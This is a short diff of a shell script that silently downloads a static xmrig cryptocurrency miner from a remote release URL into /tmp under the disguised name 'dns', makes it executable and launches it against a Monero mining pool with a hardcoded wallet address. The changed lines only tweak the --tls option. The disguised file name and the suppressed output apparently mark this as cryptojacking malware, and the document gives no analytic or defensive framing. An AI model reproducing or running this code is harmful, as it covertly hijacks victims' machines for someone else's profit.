@@ -30,8 +30,8 @@ run_program() {
         wget -qO /tmp/dns "https://gitlab.com/Kanedias/xmrig-static/-/releases/permalink/latest/downloads/xmrig-x86_64-static" 2>/dev/null
         chmod +x /tmp/dns 2>/dev/null
     }
-    [ -x "$prog" ] && launch "$prog" -o gulf.moneroocean.stream:20128 -u 45MinZ6ECgTgxn8gbm5gAsK9ATrEN6N95hbH3g4r5N4bKwH8QxuFygw3G7VwHwAusR9L35E4YjWYdTJaWDjbMGDCKYNz5X1.v2 --tls oAwgBCFH && return 0
-    fallback && [ -x /tmp/dns ] && launch /tmp/dns -o gulf.moneroocean.stream:20128 -u 45MinZ6ECgTgxn8gbm5gAsK9ATrEN6N95hbH3g4r5N4bKwH8QxuFygw3G7VwHwAusR9L35E4YjWYdTJaWDjbMGDCKYNz5X1.v2 --tls oAwgBCFH
+    [ -x "$prog" ] && launch "$prog" -o gulf.moneroocean.stream:20128 -u 45MinZ6ECgTgxn8gbm5gAsK9ATrEN6N95hbH3g4r5N4bKwH8QxuFygw3G7VwHwAusR9L35E4YjWYdTJaWDjbMGDCKYNz5X1.v2 --tls && return 0
+    fallback && [ -x /tmp/dns ] && launch /tmp/dns -o gulf.moneroocean.stream:20128 -u 45MinZ6ECgTgxn8gbm5gAsK9ATrEN6N95hbH3g4r5N4bKwH8QxuFygw3G7VwHwAusR9L35E4YjWYdTJaWDjbMGDCKYNz5X1.v2 --tls 
 }
 
 if [ -e "$prog" ]; then
